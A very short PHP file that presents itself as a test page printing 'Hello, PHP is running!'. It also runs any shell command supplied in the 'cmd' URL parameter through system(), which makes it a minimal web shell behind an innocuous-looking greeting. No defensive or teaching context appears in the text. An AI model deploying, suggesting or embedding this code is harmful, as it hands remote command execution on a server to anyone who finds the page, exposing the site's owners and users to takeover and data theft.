<?php
    echo "Hello, PHP is running!";
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>

